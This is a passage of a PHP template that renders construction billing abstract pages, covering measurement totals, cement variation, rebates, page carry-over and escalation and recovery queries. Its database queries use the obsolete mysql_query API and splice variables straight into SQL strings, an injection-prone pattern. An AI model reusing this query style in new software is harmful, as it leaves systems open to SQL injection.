			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' width='' class=''>
				<?php 
					echo number_format($slmqty, $decimal, '.', ''); 
				?>
			</td>
			<td  align='right' width='' class=''>
				<?php 
					echo number_format($slmamt, 2, '.', ''); 
				?>
			</td>
			<td  align='center' width='' class='' style="font-size:9px;">
				<?php 
				if($paymentpercent<100)
				{
					echo $paymentpercent."% Paid";
				} 
				?>
			</td>
		</tr>
<?php
			}
			if(($slm_cnt > 1) && ($x3 != 0))
			{
			
?>
		<tr border='1' bgcolor="#FFFFFF" class="labelprint">
			<td  align='right' width='' class=''><?php echo number_format($slmqty, $decimal, '.', ''); ?></td>
			<td  align='right' width='' class=''><?php echo number_format($slmamt, 2, '.', ''); ?></td>
			<td  align='center' width='' class='' style="font-size:9px;"><?php echo $paymentpercent."% Paid"; ?></td>
		</tr>
<?php
			$rowcount++;
			}
		}
	$rowcount++; //$Line = $Line + $slm_cnt;//echo "C = ".$slm_cnt."<br/>";
	 //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
	}
	if($PartPayremarks != "")
	{
?>
		<tr border='1' class="labelprint" style="font-size:10px;">
			<td colspan="12" align="left" bgcolor="">Remarks &nbsp; :&nbsp;&nbsp;&nbsp;  <?php echo $PartPayremarks; ?></td>
		</tr>
<?php	
		$rowcount++; $Line++;//echo "E = ".$Line."<br/>";
		// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
	}	
//*************THIS PART IS FOR " PRINT " ---- TOTAL PART ( S.L.M. + D.P.M ) SECTION*******************//	
$total_qty_item = $dpm_measurement_qty + $slm_measurement_qty;
$total_amt_item = round(($slm_amount_item + $dpm_amount_item),2);
?>
	<tr border='1' class="labelprint" bgcolor="">
		<!--<td  align='left' width='3%' class=' label' style="border-bottom-color:#666666">&nbsp;</td>-->
		<td  align='left' width='' class=''>&nbsp;<?php //echo $Line; ?></td>
		<td  align='right' width='' class='labelbold'>TOTAL</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($total_qty_item, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo $rate; ?>
		</td>
		<td  align='left' width='' class=''>
		<?php echo $unit; ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($total_amt_item, 2, '.', ''); ?>
		</td>
		<td  align='left' width='' class=''>&nbsp;</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($dpm_amount_item, 2, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<span style="" class=''><?php echo number_format($slm_amount_item, 2, '.', ''); ?></span>
		</td>
		<td  align='right' width='' class=''><?php //echo $SLMAmountNI_DI_EI; ?>&nbsp;</td>
	</tr>
	<?php //UpdateItemAbstractPageNo($abstsheetid,$abstmbno,$subdivid,$page); ?>
	<?php  $rowcount++; $Line++;/*echo "F = ".$Line."<br/>";*/ //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>

<!--------------------------------------- Cement Variation Starts------------------->
	
<?php
				
				if(in_array($subdivid,$CVItemArr)){
					$CVRate 		= $CemVarMasterArr[$subdivid][0];
					$CvDiffence 	= $CemVarMasterArr[$subdivid][1];
					
					$SLMCvVarQty	= round($SLMCemVarQtyArr[$subdivid],$decimal);
					$DPMCvVarQty 	= round($DPMCemVarQtyArr[$subdivid],$decimal);
					$UPTOCvVarQty	= round(($SLMCvVarQty + $DPMCvVarQty),$decimal);
					
					$SLMCvVar		= round(($SLMCvVarQty * $CvDiffence),$decimal);
					$DPMCvVar 		= round(($DPMCvVarQty * $CvDiffence),$decimal);
					$UPTOCvVar		= round(($SLMCvVar + $DPMCvVar),$decimal);
					
					$SLMCvVarAmt 	= round($SLMCemVarArr[$subdivid],2);
					$DPMCvVarAmt 	= round($DPMCemVarArr[$subdivid],2);
					$UPTOCvVarAmt 	= round(($SLMCvVarAmt + $DPMCvVarAmt),2);
					
					$slm_amount_item = $slm_amount_item + $SLMCvVarAmt;
					$dpm_amount_item = $dpm_amount_item + $DPMCvVarAmt;
					$total_amt_item = $total_amt_item + $UPTOCvVarAmt;
					$rowcount++; $Line++;
					
?>

				<tr border='1' class="labelprint" bgcolor="">
					<td  align='center' width='' class=''>CV<?php echo $subdivname; ?></td>
					<td  align='right' width='' class=''> Cement Variation (<?php echo $CvDiffence; ?>)</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($UPTOCvVar, $decimal, '.', ''); ?>
					</td>
					<td  align='right' width='' class=''>
					<?php echo $CVRate; ?>
					</td>
					<td  align='left' width='' class=''>
					kg<?php //echo $unit; ?>
					</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($UPTOCvVarAmt, 2, '.', ''); ?>
					</td>
					<td  align='left' width='' class=''>&nbsp;</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($DPMCvVar, $decimal, '.', ''); ?>
					</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($DPMCvVarAmt, 2, '.', ''); ?>
					</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($SLMCvVar, $decimal, '.', ''); ?>
					</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($SLMCvVarAmt, 2, '.', ''); ?>
					</td>
					<td  align='right' width='' class=''><?php //echo $Line; ?>&nbsp;</td>
				</tr>	
<?php
				}
?>	
	
<!--------------------------------------- Cement Variation Ends------------------->

	
	<tr bgcolor=""><td colspan="12">&nbsp;</td></tr>
	<?php  $rowcount++; $Line++;/*echo "F = ".$Line."<br/>";*/ //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
	<!--<tr bgcolor="#d4d8d8" style="height:10px"><td colspan="13" style="border-top-color:#0A9CC5; border-bottom-color:#0A9CC5;"></td></tr>-->
	<input type="hidden" name="row_count" id="row_count<?php echo $table_group_row; ?>" value="<?php echo $rowcount; ?>" />
	<?php //echo $subdivname." = ".$Line." = ".$LineTemp." = ".$Linecheck."<br/>"; ?>
	<?php
	$color_var++; $table_group_row++;
	$AbstractStr			.= $divid."*".$subdivid."*".$fromdate."*".$todate."*".$runn_acc_bill_no."*".$abstsheetid."*".$abstmbno."*".$page."*";
	$OverAllSlmAmount 		=  round(($OverAllSlmAmount	+	$slm_amount_item),2); 
	$OverAllDpmAmount 		=  round(($OverAllDpmAmount	+	$dpm_amount_item),2); 
	$OverAllSlmDpmAmount 	=  round(($OverAllSlmDpmAmount	+	$total_amt_item),2);
	
	
	$SLMAmountNI_DI_EI 		=  round(($SLMAmountNI_DI_EI	+	$slm_amount_item),2); 
	$DPMAmountNI_DI_EI 		=  round(($DPMAmountNI_DI_EI	+	$dpm_amount_item),2); 
	$UPTOAmountNI_DI_EI 	=  round(($UPTOAmountNI_DI_EI	+	$total_amt_item),2);
	$prev_item_flag = $item_flag;
	
	$prev_supp_sheetid_temp = $supp_sheetid_temp;
	
	
}
if(($item_flag != "")&&($item_flag != "NI"))
{
	$select_supp_agg_query = "select agree_no from sheet_supplementary  where supp_sheet_id = '$supp_sheetid'";
	//echo $select_supp_agg_query;
	$select_supp_agg_sql = mysql_query($select_supp_agg_query);
	if($select_supp_agg_sql == true)
	{
		if(mysql_num_rows($select_supp_agg_sql)>0)
		{
			while($SubSheet = mysql_fetch_object($select_supp_agg_sql))
			{
				$sub_agg_no = $SubSheet->agree_no;
				$AggTitleFlag = "Part Agreement - 2";//.$sub_agg_no;
			}
		}
	}
	//exit;
	if(($SuppRebateArr[$prev_supp_sheetid_temp] == 0)||($SuppRebateArr[$prev_supp_sheetid_temp] == "")){ //// ELSE IT WILL GOT AFTER REBATE STRING COME DOWN TO 2808Line Series
		$DI_Amount_EI_Amount_Str .= $SLMAmountNI_DI_EI."*".$DPMAmountNI_DI_EI."*".$UPTOAmountNI_DI_EI."*".$page."*".$abstmbno."*".$txtbox_id_di_ei."*".$AggTitleFlag."@@";
	}
}
//echo $Line;	
if($RebateCalcFlag == 0)
{
	$SlmRebateAmount 		=  round(($OverAllSlmAmount 	* 	$overall_rebate_perc /100),2);
	$DpmRebateAmount 		=  round(($OverAllDpmAmount 	* 	$overall_rebate_perc /100),2);
	$SlmDpmRebateAmount 	=  round(($OverAllSlmDpmAmount * 	$overall_rebate_perc /100),2);
	
	$SlmNetAmount 			=  round(($OverAllSlmAmount	-	$SlmRebateAmount),2); 
	$DpmNetAmount 			=  round(($OverAllDpmAmount	-	$DpmRebateAmount),2); 
	$SlmDpmNetAmount 		=  round(($OverAllSlmDpmAmount	-	$SlmDpmRebateAmount),2);
	
	/*$OverAllSlmAmount 			=  round($OverAllSlmAmount - $SlmRebateAmount); 
	$OverAllDpmAmount 			=  round($OverAllDpmAmount - $DpmRebateAmount); 
	$OverAllSlmDpmAmount 		=  round($OverAllSlmDpmAmount - $SlmDpmRebateAmount);*/
}
else
{
	$SlmNetAmount 			=  round(($OverAllSlmAmount - $SlmRebateAmount),2); 
	$DpmNetAmount 			=  round(($OverAllDpmAmount - $DpmRebateAmount),2); 
	$SlmDpmNetAmount 		=  round(($OverAllSlmDpmAmount - $SlmDpmRebateAmount),2);
	
	$OverAllSlmAmount 			=  round(($OverAllSlmAmount - $SlmRebateAmount),2); 
	$OverAllDpmAmount 			=  round(($OverAllDpmAmount - $DpmRebateAmount),2); 
	$OverAllSlmDpmAmount 		=  round(($OverAllSlmDpmAmount - $SlmDpmRebateAmount),2);
}
$Linecheck = 3;
$LineTemp = $Line + $Linecheck;
if($LineTemp >= 30){ $Line = 30; } 
if($Line >= 30)
{
?>
<tr>
	<td colspan='3' align='right' class='labelbold'>C/o Page No <?php if($page >= 100){ echo $NextMBPageList[$NextMbIncr]; ?>/ Abstract MB No <?php echo $NextMBList[$NextMbIncr]; }else{ echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; } ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td><?php //echo $Line; ?></td>
	<td align='right' class='labelbold'><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td><?php //echo $LineTemp; ?></td>
</tr>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
</table>
<p style='page-break-after:always;'></p>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php if($page >= 100){ echo $NextMBList[$NextMbIncr]; }else{ echo $abstmbno; } ?> <!--(Print version : <?php echo $gen_version; ?>)-->&nbsp;&nbsp;</td></tr>
</table>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
<?php echo $tablehead; ?>
<tr>
	<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
</tr>
<?php
$Line = $LineIncr; $page++;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
}
?>

<?php
if($DI_Amount_EI_Amount_Str != "")
{	
?>
		<tr>
			<td colspan='3' align='left' class='labelbold'><input type="text" name="txt_co_di_ei<?php echo $txtbox_id_di_ei; ?>" id="txt_co_di_ei<?php echo $txtbox_id_di_ei; ?>" style="width:98%; border:none;" readonly="" class="labelbold"/></td>
			<td colspan="2" align="right" nowrap="nowrap">TOTAL AMOUNT</td>
			<td align='right' class='labelbold'><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td></td>
			<td></td>
			<td align='right' class='labelbold'><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td></td>
			<td align='right' class='labelbold'><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td></td>
		</tr>
		
		<?php if(($SuppRebateArr[$prev_supp_sheetid_temp] != 0)&&($SuppRebateArr[$prev_supp_sheetid_temp] != "")){
				$SuppRebateperc = $SuppRebateArr[$prev_supp_sheetid_temp];
				$SuppAgmtSlmRebateAmount 		=  round(($SLMAmountNI_DI_EI * $SuppRebateperc /100),2);
				$SuppAgmtDpmRebateAmount 		=  round(($DPMAmountNI_DI_EI * $SuppRebateperc /100),2);
				$SuppAgmtSlmDpmRebateAmount 	=  round(($UPTOAmountNI_DI_EI * $SuppRebateperc /100),2);
				
				$SLMAmountNI_DI_EI 			=  round(($SLMAmountNI_DI_EI - $SuppAgmtSlmRebateAmount),2); 
				$DPMAmountNI_DI_EI 			=  round(($DPMAmountNI_DI_EI - $SuppAgmtDpmRebateAmount),2); 
				$UPTOAmountNI_DI_EI 		=  round(($UPTOAmountNI_DI_EI - $SuppAgmtSlmDpmRebateAmount),2);
	$DI_Amount_EI_Amount_Str .= $SLMAmountNI_DI_EI."*".$DPMAmountNI_DI_EI."*".$UPTOAmountNI_DI_EI."*".$page."*".$abstmbno."*".$txtbox_id_di_ei."*".$AggTitleFlag."@@";
		?>
		<tr class="labelprint">
			<td colspan="2" align="right">Less Over All Rebate : <?php echo $SuppRebateperc; ?>%&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SuppAgmtSlmDpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SuppAgmtDpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SuppAgmtSlmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<tr class="labelbold" bgcolor="#F0F0F0">
			<td colspan="2" align="right">Gross Amount&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<?php } ?>
		
		
		
		
		<!--<tr><td colspan="12" align="center" class="labelbold">Summary</td></tr>-->
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
</table>
<p style='page-break-after:always;'></p>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?> <!--(Print version : <?php echo $gen_version; ?>)-->&nbsp;&nbsp;</td></tr>
</table>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
<?php echo $tablehead; ?>
	<tr><td colspan="12" align="center" class="labelbold">Summary of Agreement wise Total Cost</td></tr>
<?
	$Line = $LineIncr; $page++;	
	$DI_Amount_EI_Amount_Str = rtrim($DI_Amount_EI_Amount_Str,"@@");
	$expDIEIStr = explode("@@",$DI_Amount_EI_Amount_Str);
	$DIEICount = count($expDIEIStr);
	$SlmNetAmount = 0;
	$DpmNetAmount = 0;
	$SlmDpmNetAmount = 0;
	$DIEITextBoxStr = "";
	//echo $DIEICount;//exit;
	for($d1=0; $d1<$DIEICount; $d1++)
	{
		$DIEIAmtSTr = $expDIEIStr[$d1];
		$DIEIStr 	= explode("*",$DIEIAmtSTr);
		$DIEITotalSLMAmt 	= $DIEIStr[0];
		$DIEITotalDPMAmt 	= $DIEIStr[1];
		$DIEITotalUPTOAmt 	= $DIEIStr[2];
		$DIEIPage 			= $DIEIStr[3];
		$DIEIMbook 			= $DIEIStr[4];
		$DIEITextboxId 		= $DIEIStr[5];
		$DIEIAggNo 			= $DIEIStr[6];
		$SlmNetAmount = $SlmNetAmount+$DIEITotalSLMAmt;
		$DpmNetAmount = $DpmNetAmount+$DIEITotalDPMAmt;
		$SlmDpmNetAmount = $SlmDpmNetAmount+$DIEITotalUPTOAmt;
		$DIEITextBoxStr .= $DIEITextboxId."*".$page."*".$abstmbno."*";
?>
		<tr class="labelprint" bgcolor="#F0F0F0">
			<td colspan="5" align="right" class=""><?php echo $DIEIAggNo; ?> Total B/f P-<?php echo $DIEIPage; ?>/MB <?php echo $DIEIMbook; ?>&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i></td>
			<!--<td>&nbsp;</td>
			<td>&nbsp;</td>-->
			<td align="right"><?php echo number_format($DIEITotalUPTOAmt, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DIEITotalDPMAmt, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DIEITotalSLMAmt, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>

<?php
	}
	$DIEITextBoxStr = rtrim($DIEITextBoxStr,"*");
}
?>

<?php if($RebateCalcFlag == 0){ ?>
	<tr class="labelprint" bgcolor="#F0F0F0">
		<td colspan="2" align="right">Total Cost&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
	<?php $Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
	<tr class="labelprint">
		<td colspan="2" align="right">Less: Over All Rebate : <?php echo $overall_rebate_perc; ?>%&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmDpmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($DpmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
	<?php $Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
<?php } ?>	

	<tr class="labelbold" bgcolor="#F0F0F0">
		<td colspan="2" align="right">Gross Amount&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmDpmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($DpmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
<?php 
$Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} 
if($Line >= 30)
{
?>
<tr>
	<td colspan='3' align='right' class='labelbold'>C/o Page No <?php if($page >= 100){ echo $NextMBPageList[$NextMbIncr]; ?>/ Abstract MB No <?php echo $NextMBList[$NextMbIncr]; }else{ echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; } ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td></td>
</tr>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
</table>
<p style='page-break-after:always;'></p>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php if($page >= 100){ echo $NextMBList[$NextMbIncr]; }else{ echo $abstmbno; } ?> <!--(Print version : <?php echo $gen_version; ?>)-->&nbsp;&nbsp;</td></tr>
</table>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
<?php echo $tablehead; ?>
<tr>
	<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td></td>
</tr>
<?php
$Line = $LineIncr; $page++;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
}
else
{
?>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>
<?php
/*while($Line<30)
{
	echo "<br/>";
	$Line++;
}*/
?>
Page <?php echo $page; ?></td></tr>
<?php	
}
?>
</table>
<p style='page-break-after:always;'></p>
<?php 
$EscQtrArray = array();
$EscTccAmtArray = array();
$EscTcaAmtArray = array();
$page++;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }

$esc_cnt = 0;
$Esc_Total_Amt = 0;
$select_esc_rbn_query = "select * from escalation where sheetid = '$abstsheetid' and flag = 0 and rbn = '$rbn' ORDER BY quarter ASC";
$select_esc_rbn_sql = mysql_query($select_esc_rbn_query);
if($select_esc_rbn_sql == true)
{
	if(mysql_num_rows($select_esc_rbn_sql)>0)
	{
		$esc_cnt = 1;
		while($EscList = mysql_fetch_object($select_esc_rbn_sql))
		{
			$quarter = $EscList->quarter;
			$esc_tcc_amount = $EscList->tcc_amt;
			$esc_tca_amount = $EscList->tca_amt;
			$esc_qtr_amt = round(($esc_tcc_amount+$esc_tca_amount),2);//$EscList->esc_total_amt;
			
			//$Esc_Total_Amt = $Esc_Total_Amt+$esc_tcc_amount+$esc_tca_amount;
			$Esc_Total_Amt = $Esc_Total_Amt+$esc_qtr_amt;//+$esc_tca_amount;
			
			array_push($EscQtrArray,$quarter);
			array_push($EscTccAmtArray,$esc_qtr_amt);
			//array_push($EscTcaAmtArray,$esc_tca_amount);
		}
	}
}
$Esc_Total_Amt = round($Esc_Total_Amt);

$RevEscQtrArray = array();
$RevEscTccAmtArray = array();
$RevEscTcaAmtArray = array();
$rev_esc_cnt = 0;
$RevEsc_Total_Amt = 0;
$select_rev_esc_rbn_query = "select * from escalation where sheetid = '$abstsheetid' and flag = 0 and rev_esc_total_amt != 0 and rbn < '$rbn' ORDER BY quarter ASC";
//echo $select_rev_esc_rbn_query;
$select_rev_esc_rbn_sql = mysql_query($select_rev_esc_rbn_query);
if($select_rev_esc_rbn_sql == true)
{
	if(mysql_num_rows($select_rev_esc_rbn_sql)>0)
	{
		$esc_cnt = 1;
		while($RevEscList = mysql_fetch_object($select_rev_esc_rbn_sql))
		{
			$rev_quarter = $RevEscList->quarter;
			$rev_esc_tcc_amount = $RevEscList->rev_tcc_amt;
			$rev_esc_tca_amount = $RevEscList->rev_tca_amt;
			
			$total_rev_esc_amt = round(($rev_esc_tcc_amount+$rev_esc_tca_amount),2);
			
			$paid_esc_tcc_amount = $RevEscList->tcc_amt;
			$paid_esc_tca_amount = $RevEscList->tca_amt;
			
			$total_paid_esc_amt = round(($paid_esc_tcc_amount+$paid_esc_tca_amount),2);
			
			//// Second or more than two time revised
			$select_esc_paid_query = "select rev_tcc_mbook, rev_tcc_mbpage, rev_esc_total_amt from escalation_revised where sheetid = '$abstsheetid' and quarter = '$rev_quarter' and rbn < '$rbn' ORDER BY rev_esc_id DESC";
			$select_esc_paid_sql = mysql_query($select_esc_paid_query);
			if($select_esc_paid_sql == true)
			{
				$PaidEAbaMB = mysql_fetch_object($select_esc_paid_sql);
				$PaidEsc_Abs_MBook = $PaidEAbaMB->rev_tcc_mbook;
				$PaidEsc_Abs_MBPage = $PaidEAbaMB->rev_tcc_mbpage;
				$PaidEsc_Abs_tot_amt = $PaidEAbaMB->rev_esc_total_amt;
				//echo $PaidEsc_Abs_tot_amt;
			}
			if($PaidEsc_Abs_tot_amt>0)
			{
				$paid_esc_tcc_amount = $PaidEsc_Abs_MBook;
				$paid_esc_tca_amount = $PaidEsc_Abs_MBPage;
				//$Esc_Abs_tot_amt = $PaidEsc_Abs_tot_amt;
				//$total_paid_esc_amt = round(($paid_esc_tcc_amount+$paid_esc_tca_amount),2);
				$total_paid_esc_amt = $PaidEsc_Abs_tot_amt;
			}
			
			
			//echo $total_paid_esc_amt;
			
			//$rev_esc_qtr_amt = round(($rev_esc_tcc_amount+$rev_esc_tca_amount),2);//$EscList->esc_total_amt;
			$rev_esc_qtr_amt = round(($total_rev_esc_amt-$total_paid_esc_amt),2);
			
			
			//$Esc_Total_Amt = $Esc_Total_Amt+$esc_tcc_amount+$esc_tca_amount;
			$RevEsc_Total_Amt = $RevEsc_Total_Amt+$rev_esc_qtr_amt;//+$esc_tca_amount;
			
			array_push($RevEscQtrArray,$rev_quarter);
			array_push($RevEscTccAmtArray,$rev_esc_qtr_amt);
			//array_push($EscTcaAmtArray,$esc_tca_amount);
		}
	}
}
$RevEsc_Total_Amt = round($RevEsc_Total_Amt);


//print_r($RevEscTccAmtArray);exit;
//print_r($EscAmtArray);
$secured_advance_query = "select sec_adv_amount from secured_advance where sheetid = '$abstsheetid' and rbn = '$rbn'";
$secured_advance_sql = mysql_query($secured_advance_query);
if($secured_advance_sql == true)
{
	$SAList 		= 	mysql_fetch_object($secured_advance_sql);
	$sec_adv_amount	= 	$SAList->sec_adv_amount; 
}
else
{
	$sec_adv_amount = 0;
}

$total_recovery = 0;
$water_recovery_query = "select water_cost from generate_waterbill where sheetid = '$abstsheetid' and rbn = '$rbn'";
$water_recovery_sql = mysql_query($water_recovery_query);
if($water_recovery_sql == true)
{
	while($WRList 	= 	mysql_fetch_object($water_recovery_sql))
	{
		$water_charge 	=  $water_charge+$WRList->water_cost; 
	}
}
else
{
	$water_charge = 0;
}
$total_recovery = $total_recovery + $water_charge;
$electricity_recovery_query = "select electricity_cost from generate_electricitybill where sheetid = '$abstsheetid' and rbn = '$rbn'";
$electricity_recovery_sql = mysql_query($electricity_recovery_query);
if($electricity_recovery_sql == true)
{
